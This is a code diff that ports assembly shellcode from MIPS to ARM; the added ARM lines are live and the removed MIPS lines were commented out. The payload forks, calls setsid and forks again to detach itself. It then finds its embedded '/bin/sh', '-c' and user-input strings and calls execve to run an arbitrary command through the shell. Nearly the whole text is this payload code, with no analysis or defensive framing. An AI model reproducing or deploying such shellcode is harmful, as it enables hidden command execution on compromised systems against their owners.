@@ -4,75 +4,61 @@
 #define TACC "-c\x00\x00\x00\x00\x00"
 
 .globl main
-.type main, @function
+.type main, %function
 
 main:
-    /* TODO
-    // Fork, setsid, fork, exit in ARM
-    li $v0, SYS_fork
-    syscall
-    beq $v0, 0, setsid
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
+    mov r7, #SYS_fork
+    svc #0
+    cmp r0, #0
+    beq setsid
+    mov r0, #0
+    mov r7, #SYS_exit
+    svc #0
 
 setsid:
-    li $v0, SYS_setsid
-    syscall
-    li $v0, SYS_fork
-    syscall
-    beq $v0, 0, forkexit
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
-    */
+    mov r7, #SYS_setsid
+    svc #0
+    mov r7, #SYS_fork
+    svc #0
+    cmp r0, #0
+    beq forkexit
+    mov r0, #0
+    mov r7, #SYS_exit
+    svc #0
 
 forkexit:
-    /* TODO
-    // String manipulation in ARM and setup execve call
     b get_binsh
 
 ret1:
-    sw $ra, -16($sp)
-    lw $a0, -16($sp)
+    mov r0, lr
     b get_tacc
 
 ret2:
-    sw $ra, -12($sp)
+    mov r3, lr
     b get_userinput
 
 ret3:
-    add $ra, $ra, 0
-    sw $ra, -8($sp)
-    slti $ra, $zero, -1
-    sw $ra, -4($sp)
+    mov r4, lr
 
 binsh:
-    sub $sp, $sp, 16
-    slti $a1, $zero, -1
-    add $a1, $zero, $sp
-    slti $a2, $zero, -1
-    li $v0, SYS_execve
-    syscall
-
-exit:
-    slti $a0, $zero, -1
-    li $v0, SYS_exit
-    syscall
+    mov r2, #0
+    push {r2}
+    push {r4}
+    push {r3}
+    push {r0}
+    mov r1, sp
+    mov r7, #SYS_execve
+    svc #0
 
 get_binsh:
-    li $t0, -1
-    bltzal $t0, ret1
+    bl ret1
     .string BINSH
 
 get_tacc:
-    li $t0, -1
-    bltzal $t0, ret2
+    bl ret2
     .string TACC
 
 get_userinput:
-    li $t0, -1
-    bltzal $t0, ret3
+    bl ret3
 
 user_input:
-    */
